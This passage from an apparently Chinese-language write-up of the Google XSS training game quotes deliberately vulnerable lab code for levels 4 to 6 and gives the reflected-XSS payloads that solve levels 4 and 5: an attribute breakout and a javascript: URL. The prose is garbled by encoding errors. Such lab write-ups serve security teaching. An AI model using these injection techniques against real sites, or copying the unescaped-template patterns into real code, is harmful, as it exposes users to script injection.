class-name">MainPage</span><span class="token punctuation">(</span>webapp<span class="token punctuation">.</span>RequestHandler<span class="token punctuation">)</span><span class="token punctuation">:</span>   <span class="token keyword">def</span> <span class="token function">render_template</span><span class="token punctuation">(</span>self<span class="token punctuation">,</span> filename<span class="token punctuation">,</span> context<span class="token operator">=</span><span class="token punctuation">&#123;</span><span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    path <span class="token operator">=</span> os<span class="token punctuation">.</span>path<span class="token punctuation">.</span>join<span class="token punctuation">(</span>os<span class="token punctuation">.</span>path<span class="token punctuation">.</span>dirname<span class="token punctuation">(</span>__file__<span class="token punctuation">)</span><span class="token punctuation">,</span> filename<span class="token punctuation">)</span>    self<span class="token punctuation">.</span>response<span class="token punctuation">.</span>out<span class="token punctuation">.</span>write<span class="token punctuation">(</span>template<span class="token punctuation">.</span>render<span class="token punctuation">(</span>path<span class="token punctuation">,</span> context<span class="token punctuation">)</span><span class="token punctuation">)</span>   <span class="token keyword">def</span> <span class="token function">get</span><span class="token punctuation">(</span>self<span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token comment"># Disable the reflected XSS filter for demonstration purposes</span>    self<span class="token punctuation">.</span>response<span class="token punctuation">.</span>headers<span class="token punctuation">.</span>add_header<span class="token punctuation">(</span><span class="token string">"X-XSS-Protection"</span><span class="token punctuation">,</span> <span class="token string">"0"</span><span class="token punctuation">)</span>     <span class="token keyword">if</span> <span class="token keyword">not</span> self<span class="token punctuation">.</span>request<span class="token punctuation">.</span>get<span class="token punctuation">(</span><span class="token string">'timer'</span><span class="token punctuation">)</span><span class="token punctuation">:</span>      <span class="token comment"># Show main timer page</span>      self<span class="token punctuation">.</span>render_template<span class="token punctuation">(</span><span class="token string">'index.html'</span><span class="token punctuation">)</span>    <span class="token keyword">else</span><span class="token punctuation">:</span>      <span class="token comment"># Show the results page</span>      timer<span class="token operator">=</span> self<span class="token punctuation">.</span>request<span class="token punctuation">.</span>get<span class="token punctuation">(</span><span class="token string">'timer'</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">)</span>      self<span class="token punctuation">.</span>render_template<span class="token punctuation">(</span><span class="token string">'timer.html'</span><span class="token punctuation">,</span> <span class="token punctuation">&#123;</span> <span class="token string">'timer'</span> <span class="token punctuation">:</span> timer <span class="token punctuation">&#125;</span><span class="token punctuation">)</span>         <span class="token keyword">return</span> application <span class="token operator">=</span> webapp<span class="token punctuation">.</span>WSGIApplication<span class="token punctuation">(</span><span class="token punctuation">[</span> <span class="token punctuation">(</span><span class="token string">'.*'</span><span class="token punctuation">,</span> MainPage<span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token punctuation">]</span><span class="token punctuation">,</span> debug<span class="token operator">=</span><span class="token boolean">False</span><span class="token punctuation">)</span></code></pre><p>Timer.html</p><pre class="language-html" data-language="html"><code class="language-html"><span class="token doctype"><span class="token punctuation">&lt;!</span><span class="token name">doctype</span> <span class="token name">html</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>html</span><span class="token punctuation">></span></span>  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>head</span><span class="token punctuation">></span></span>    <span class="token comment">&lt;!-- Internal game scripts/styles, mostly boring stuff --></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>script</span> <span class="token attr-name">src</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>/static/game-frame.js<span class="token punctuation">"</span></span><span class="token punctuation">></span></span><span class="token script"></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>script</span><span class="token punctuation">></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>link</span> <span class="token attr-name">rel</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>stylesheet<span class="token punctuation">"</span></span> <span class="token attr-name">href</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>/static/game-frame-styles.css<span class="token punctuation">"</span></span> <span class="token punctuation">/></span></span>     <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>script</span><span class="token punctuation">></span></span><span class="token script"><span class="token language-javascript">      <span class="token keyword">function</span> <span class="token function">startTimer</span><span class="token punctuation">(</span><span class="token parameter">seconds</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        seconds <span class="token operator">=</span> <span class="token function">parseInt</span><span class="token punctuation">(</span>seconds<span class="token punctuation">)</span> <span class="token operator">||</span> <span class="token number">3</span><span class="token punctuation">;</span>        <span class="token function">setTimeout</span><span class="token punctuation">(</span><span class="token keyword">function</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>           window<span class="token punctuation">.</span><span class="token function">confirm</span><span class="token punctuation">(</span><span class="token string">"Time is up!"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>          window<span class="token punctuation">.</span>history<span class="token punctuation">.</span><span class="token function">back</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span><span class="token punctuation">,</span> seconds <span class="token operator">*</span> <span class="token number">1000</span><span class="token punctuation">)</span><span class="token punctuation">;</span>      <span class="token punctuation">&#125;</span>    </span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>script</span><span class="token punctuation">></span></span>  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>head</span><span class="token punctuation">></span></span>  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>body</span> <span class="token attr-name">id</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>level4<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>img</span> <span class="token attr-name">src</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>/static/logos/level4.png<span class="token punctuation">"</span></span> <span class="token punctuation">/></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>br</span><span class="token punctuation">></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>img</span> <span class="token attr-name">src</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>/static/loading.gif<span class="token punctuation">"</span></span> <span class="token attr-name">onload</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>startTimer(<span class="token punctuation">'</span>&#123;&#123; timer &#125;&#125;<span class="token punctuation">'</span>);<span class="token punctuation">"</span></span> <span class="token punctuation">/></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>br</span><span class="token punctuation">></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>div</span> <span class="token attr-name">id</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>message<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>Your timer will execute in &#123;&#123; timer &#125;&#125; seconds.<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>div</span><span class="token punctuation">></span></span>  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>body</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>html</span><span class="token punctuation">></span></span></code></pre><p>å…³é”®ä»£ç </p><pre class="language-html" data-language="html"><code class="language-html"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>img</span> <span class="token attr-name">src</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>/static/loading.gif<span class="token punctuation">"</span></span> <span class="token attr-name">onload</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>startTimer(<span class="token punctuation">'</span>&#123;&#123; timer &#125;&#125;<span class="token punctuation">'</span>);<span class="token punctuation">"</span></span> <span class="token punctuation">/></span></span></code></pre><p>é»˜è®¤3ç§’<code>seconds = parseInt(seconds) || 3;</code></p><p>è¾“å…¥100ï¼Œçœ‹åˆ°åŠ è½½å¦‚ä¸‹</p><p><code>&lt;img src=&quot;/static/loading.gif&quot; onload=&quot;startTimer(&#39;100&#39;);&quot;&gt;</code></p><p>äºæ˜¯æƒ³åŠæ³•é—­åˆï¼Œç”¨å•å¼•å·é—­åˆ<code>startTimer</code>ï¼Œç„¶åå†™å¼¹çª—å†å’Œåé¢çš„<code>&#39;)</code>é—­åˆ</p><blockquote><p>onload äº‹ä»¶ä¼šåœ¨é¡µé¢æˆ–å›¾åƒåŠ è½½å®Œæˆåç«‹å³å‘ç”Ÿ</p></blockquote><p>Payload:</p><pre class="language-none"><code class="language-none">&#39;);alert(&#39;1</code></pre><p>å³å˜ä¸º<code>&lt;img src=&quot;/static/loading.gif&quot; onload=&quot;startTimer(&#39;&#39;);alert(&#39;1&#39;);&quot;&gt;</code></p><img src="/article/xss/image-20210424152557697.png" class="" title="level4-1" loading="lazy"><img src="/article/xss/image-20210424152620652.png" class="" title="level4-2" loading="lazy"><hr><h2 id="level5"><a href="#level5" class="headerlink" title="level5"></a>level5</h2><p><a href="https://xss-game.appspot.com/level5/frame#">https://xss-game.appspot.com/level5/frame#</a></p><p>æºç Â·confirm.html</p><pre class="language-html" data-language="html"><code class="language-html"><span class="token doctype"><span class="token punctuation">&lt;!</span><span class="token name">doctype</span> <span class="token name">html</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>html</span><span class="token punctuation">></span></span>  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>head</span><span class="token punctuation">></span></span>    <span class="token comment">&lt;!-- Internal game scripts/styles, mostly boring stuff --></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>script</span> <span class="token attr-name">src</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>/static/game-frame.js<span class="token punctuation">"</span></span><span class="token punctuation">></span></span><span class="token script"></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>script</span><span class="token punctuation">></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>link</span> <span class="token attr-name">rel</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>stylesheet<span class="token punctuation">"</span></span> <span class="token attr-name">href</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>/static/game-frame-styles.css<span class="token punctuation">"</span></span> <span class="token punctuation">/></span></span>  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>head</span><span class="token punctuation">></span></span>   <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>body</span> <span class="token attr-name">id</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>level5<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>img</span> <span class="token attr-name">src</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>/static/logos/level5.png<span class="token punctuation">"</span></span> <span class="token punctuation">/></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>br</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>br</span><span class="token punctuation">></span></span>    Thanks for signing up, you will be redirected soon...    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>script</span><span class="token punctuation">></span></span><span class="token script"><span class="token language-javascript">      <span class="token function">setTimeout</span><span class="token punctuation">(</span><span class="token keyword">function</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span> window<span class="token punctuation">.</span>location <span class="token operator">=</span> <span class="token string">'&#123;&#123; next &#125;&#125;'</span><span class="token punctuation">;</span> <span class="token punctuation">&#125;</span><span class="token punctuation">,</span> <span class="token number">5000</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    </span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>script</span><span class="token punctuation">></span></span>  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>body</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>html</span><span class="token punctuation">></span></span></code></pre><p>Level.py</p><pre class="language-python" data-language="python"><code class="language-python"><span class="token keyword">class</span> <span class="token class-name">MainPage</span><span class="token punctuation">(</span>webapp<span class="token punctuation">.</span>RequestHandler<span class="token punctuation">)</span><span class="token punctuation">:</span>  <span class="token keyword">def</span> <span class="token function">render_template</span><span class="token punctuation">(</span>self<span class="token punctuation">,</span> filename<span class="token punctuation">,</span> context<span class="token operator">=</span><span class="token punctuation">&#123;</span><span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    path <span class="token operator">=</span> os<span class="token punctuation">.</span>path<span class="token punctuation">.</span>join<span class="token punctuation">(</span>os<span class="token punctuation">.</span>path<span class="token punctuation">.</span>dirname<span class="token punctuation">(</span>__file__<span class="token punctuation">)</span><span class="token punctuation">,</span> filename<span class="token punctuation">)</span>    self<span class="token punctuation">.</span>response<span class="token punctuation">.</span>out<span class="token punctuation">.</span>write<span class="token punctuation">(</span>template<span class="token punctuation">.</span>render<span class="token punctuation">(</span>path<span class="token punctuation">,</span> context<span class="token punctuation">)</span><span class="token punctuation">)</span>   <span class="token keyword">def</span> <span class="token function">get</span><span class="token punctuation">(</span>self<span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token comment"># Disable the reflected XSS filter for demonstration purposes</span>    self<span class="token punctuation">.</span>response<span class="token punctuation">.</span>headers<span class="token punctuation">.</span>add_header<span class="token punctuation">(</span><span class="token string">"X-XSS-Protection"</span><span class="token punctuation">,</span> <span class="token string">"0"</span><span class="token punctuation">)</span>     <span class="token comment"># Route the request to the appropriate template</span>    <span class="token keyword">if</span> <span class="token string">"signup"</span> <span class="token keyword">in</span> self<span class="token punctuation">.</span>request<span class="token punctuation">.</span>path<span class="token punctuation">:</span>      self<span class="token punctuation">.</span>render_template<span class="token punctuation">(</span><span class="token string">'signup.html'</span><span class="token punctuation">,</span>         <span class="token punctuation">&#123;</span><span class="token string">'next'</span><span class="token punctuation">:</span> self<span class="token punctuation">.</span>request<span class="token punctuation">.</span>get<span class="token punctuation">(</span><span class="token string">'next'</span><span class="token punctuation">)</span><span class="token punctuation">&#125;</span><span class="token punctuation">)</span>    <span class="token keyword">elif</span> <span class="token string">"confirm"</span> <span class="token keyword">in</span> self<span class="token punctuation">.</span>request<span class="token punctuation">.</span>path<span class="token punctuation">:</span>      self<span class="token punctuation">.</span>render_template<span class="token punctuation">(</span><span class="token string">'confirm.html'</span><span class="token punctuation">,</span>         <span class="token punctuation">&#123;</span><span class="token string">'next'</span><span class="token punctuation">:</span> self<span class="token punctuation">.</span>request<span class="token punctuation">.</span>get<span class="token punctuation">(</span><span class="token string">'next'</span><span class="token punctuation">,</span> <span class="token string">'welcome'</span><span class="token punctuation">)</span><span class="token punctuation">&#125;</span><span class="token punctuation">)</span>    <span class="token keyword">else</span><span class="token punctuation">:</span>      self<span class="token punctuation">.</span>render_template<span class="token punctuation">(</span><span class="token string">'welcome.html'</span><span class="token punctuation">,</span> <span class="token punctuation">&#123;</span><span class="token punctuation">&#125;</span><span class="token punctuation">)</span>         <span class="token keyword">return</span> application <span class="token operator">=</span> webapp<span class="token punctuation">.</span>WSGIApplication<span class="token punctuation">(</span><span class="token punctuation">[</span> <span class="token punctuation">(</span><span class="token string">'.*'</span><span class="token punctuation">,</span> MainPage<span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token punctuation">]</span><span class="token punctuation">,</span> debug<span class="token operator">=</span><span class="token boolean">False</span><span class="token punctuation">)</span></code></pre><p>Signup.html</p><pre class="language-html" data-language="html"><code class="language-html"><span class="token doctype"><span class="token punctuation">&lt;!</span><span class="token name">doctype</span> <span class="token name">html</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>html</span><span class="token punctuation">></span></span>  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>head</span><span class="token punctuation">></span></span>    <span class="token comment">&lt;!-- Internal game scripts/styles, mostly boring stuff --></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>script</span> <span class="token attr-name">src</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>/static/game-frame.js<span class="token punctuation">"</span></span><span class="token punctuation">></span></span><span class="token script"></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>script</span><span class="token punctuation">></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>link</span> <span class="token attr-name">rel</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>stylesheet<span class="token punctuation">"</span></span> <span class="token attr-name">href</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>/static/game-frame-styles.css<span class="token punctuation">"</span></span> <span class="token punctuation">/></span></span>  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>head</span><span class="token punctuation">></span></span>   <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>body</span> <span class="token attr-name">id</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>level5<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>img</span> <span class="token attr-name">src</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>/static/logos/level5.png<span class="token punctuation">"</span></span> <span class="token punctuation">/></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>br</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>br</span><span class="token punctuation">></span></span>    <span class="token comment">&lt;!-- We're ignoring the email, but the poor user will never know! --></span>    Enter email: <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>input</span> <span class="token attr-name">id</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>reader-email<span class="token punctuation">"</span></span> <span class="token attr-name">name</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>email<span class="token punctuation">"</span></span> <span class="token attr-name">value</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span><span class="token punctuation">"</span></span><span class="token punctuation">></span></span>     <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>br</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>br</span><span class="token punctuation">></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>a</span> <span class="token attr-name">href</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>&#123;&#123; next &#125;&#125;<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>Next >><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>a</span><span class="token punctuation">></span></span>  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>body</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>html</span><span class="token punctuation">></span></span></code></pre><p>Welcome.html</p><pre class="language-html" data-language="html"><code class="language-html"><span class="token doctype"><span class="token punctuation">&lt;!</span><span class="token name">doctype</span> <span class="token name">html</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>html</span><span class="token punctuation">></span></span>  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>head</span><span class="token punctuation">></span></span>    <span class="token comment">&lt;!-- Internal game scripts/styles, mostly boring stuff --></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>script</span> <span class="token attr-name">src</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>/static/game-frame.js<span class="token punctuation">"</span></span><span class="token punctuation">></span></span><span class="token script"></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>script</span><span class="token punctuation">></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>link</span> <span class="token attr-name">rel</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>stylesheet<span class="token punctuation">"</span></span> <span class="token attr-name">href</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>/static/game-frame-styles.css<span class="token punctuation">"</span></span> <span class="token punctuation">/></span></span>  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>head</span><span class="token punctuation">></span></span>   <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>body</span> <span class="token attr-name">id</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>level5<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>    Welcome! Today we are announcing the much anticipated<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>br</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>br</span><span class="token punctuation">></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>img</span> <span class="token attr-name">src</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>/static/logos/level5.png<span class="token punctuation">"</span></span> <span class="token punctuation">/></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>br</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>br</span><span class="token punctuation">></span></span>     <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>a</span> <span class="token attr-name">href</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>/level5/frame/signup?next=confirm<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>Sign up<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>a</span><span class="token punctuation">></span></span>     for an exclusive Beta.  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>body</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>html</span><span class="token punctuation">></span></span></code></pre><p>å…³é”®ä»£ç </p><pre class="language-html" data-language="html"><code class="language-html"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>a</span> <span class="token attr-name">href</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>&#123;&#123; next &#125;&#125;<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>Next >><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>a</span><span class="token punctuation">></span></span></code></pre><p>ç›´æ¥è®²nextå‚æ•°å¡«å…¥htmlï¼Œhrefä¹Ÿæ˜¯å¯ä»¥æ‰§è¡ŒJavaScriptä»£ç çš„</p><p>payloadï¼š</p><pre class="language-none"><code class="language-none">next&#x3D;javascript:alert(1);</code></pre><p>ç„¶åç‚¹<code>Next&gt;&gt;</code>å°±è¡Œ</p><img src="/article/xss/image-20210424163533941.png" class="" title="level5-1" loading="lazy"><img src="/article/xss/85F04A35-370A-4FD5-9526-C80E89A2546A.png" class="" title="level5-2" loading="lazy"><blockquote><p>è¶…é“¾æ¥æ ‡ç­¾<code>&lt;a&gt;</code>,ç”¨æˆ·ç‚¹å‡»ç›¸åº”æŒ‰é’®æ—¶å¯ä»¥è·³è½¬åˆ°æ–°çš„é¡µé¢ï¼ˆæ‰§è¡ŒæŸä¸ªJavaScriptï¼‰ï¼Œç”¨åˆ°äº†è¿™æ ·çš„ä»£ç ç»“æ„ï¼š</p><p><code>&lt;a href=&#39;javascript:doSomething()&#39;&gt;...&lt;/a&gt;</code></p><p>æ‰§è¡Œæƒé¦–å…ˆè½åœ¨doSomething()å‡½æ•°ï¼Œè‹¥å­˜åœ¨è¿”å›å€¼åˆ™å°†è¿”å›å€¼è¿”ç»™è¶…é“¾æ¥è¿›è¡Œåˆæˆ</p></blockquote><hr><h2 id="level6"><a href="#level6" class="headerlink" title="level6"></a>level6</h2><p><a href="https://xss-game.appspot.com/level6/frame#/static/gadget.js">https://xss-game.appspot.com/level6/frame#/static/gadget.js</a></p><p>æºç Â·index.html</p><pre class="language-html" data-language="html"><code class="language-html"><span class="token doctype"><span class="token punctuation">&lt;!</span><span class="token name">doctype</span> <span class="token name">html</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>html</span><span class="token punctuation">></span></span>  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>head</span><span class="token punctuation">></span></span>    <span class="token comment">&lt;!-- Internal game scripts/styles, mostly boring stuff --></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>script</span> <span class="token attr-name">src</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>/static/game-frame.js<span class="token punctuation">"</span></span><span class="token punctuation">></span></span><span class="token script"></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>script</span><span class="token punctuation">></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>link</span> <span class="token attr-name">rel</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>stylesheet<span class="token punctuation">"</span></span> <span class="token attr-name">href</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>/static/game-frame-styles.css<span class="token punctuation">"</span></span> <span class="token punctuation">/></span></span>     <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>script</span><span class="token punctuation">></span></span><span class="token script"><span class="token language-javascript">    <span class="token keyword">function</span> <span class="token function">setInnerText</span><span class="token punctuation">(</span><span class="token parameter">element<span class="token punctuation">,</span> value</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>      <span class="token keyword">if</span> <span class="token punctuation">(</span>element<span class="token punctuation">.</span>innerText<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        element<span class="token punctuation">.</span>innerText <span class="token operator">=</span> value<span class="token punctuation">;</span>      <span class="token punctuation">&#125;</span> <span class="token keyword">else</span> <span class="token punctuation">&#123;</span>        element<span class="token punctuation">.</span>textContent <span class="token operator">=</span> value<span class="token punctuation">;</span>      <span class="token punctuation">&#125;</span>    <span class="token punctuation">&#125;</span>     <span class="token keyword">function</span> <span class="token function">includeGadget</span><span class="token punctuation">(</span><span class="token parameter">url</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>      <span class="token keyword">var</span> scriptEl <span class="token operator">=</span> document<span class="token punctuation">.</span><span class="token function">createElement</span><span class="token punctuation">(</span><span class="token string">'script'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>       <span class="token comment">// This will totally prevent us from loading evil URLs!</span>      <span class="token keyword">if</span> <span class="token punctuation">(</span>url<span class="token punctuation">.</span><span class="token function">match</span><span class="token punctuation">(</span><span class="token regex"><span class="token regex-delimiter">/</span><span class="token regex-source language-regex">^https?:\/\/</span><span class="token regex-delimiter">/</span></span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token function">setInnerText</span><span class="token punctuation">(</span>document<span class="token punctuation">.</span><span class="token function">getElementById</span><span class="token punctuation">(</span><span class="token string">"log"</span><span class="token punctuation">)</span><span class="token punctuation">,</span>          <span class="token string">"Sorry, cannot load a URL containing \"http\"."</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">return</span><span class="token punctuation">;</span>      <span class="token punctuation">&#125;</span>       <span class="token comment">// Load this awesome gadget</span>      scriptEl<span class="token punctuation">.</span>src <span class="token operator">=</span> url<span class="token punctuation">;</span>       <span class="token comment">// Show log messages</span>      scriptEl<span class="token punctuation">.</span><span class="token function-variable function">onload</span> <span class="token operator">=</span> <span class="token keyword">function</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>         <span class="token function">setInnerText</span><span class="token punctuation">(</span>document<span class="token punctuation">.</span><span class="token function">getElementById</span><span class="token punctuation">(</span><span class="token string">"log"</span><span class="token punctuation">)</span><span class="token punctuation">,</span>            <span class="token string">"Loaded gadget from "</span> <span class="token operator">+</span> url<span class="token punctuation">)</span><span class="token punctuation">;</span>      <span class="token punctuation">&#125;</span>      scriptEl<span class="token punctuation">.</span><span class="token function-variable function">onerror</span> <span class="token operator">=</span> <span class="token keyword">function</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>         <span class="token function">setInnerText</span><span class="token punctuation">(</span>document<span class="token punctuation">.</span><span class="token function">getElementById</span><span class="token punctuation">(</span><span class="token string">"log"</span><span class="token punctuation">)</span><span class="token punctuation">,</span>            <span class="token string">"Couldn't load gadget from "</span> <span class="token operator">+</span> url<span class="token punctuation">)</span><span class="token punctuation">;</span>      <span class="token punctuation">&#125;</span>       document<span class="token punctuation">.</span>head<span class="token punctuation">.</span><span class="token function">appendChild</span><span class="token punctuation">(</span>scriptEl<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>     <span class="token comment">// Take the value after # and use it as the gadget filename.</span>    <span class="token keyword">function</span> <span class="token function">getGadgetName</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>       <span class="token keyword">return</span> window<span class="token punctuation">.</span>location<span class="token punctuation">.</span>hash<span class="token punctuation">.</span><span class="token function">substr</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span> <span class="token operator">||</span> <span class="token string">"/static/gadget.js"</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>     <span class="token function">includeGadget</span><span class="token punctuation">(</span><span class="token 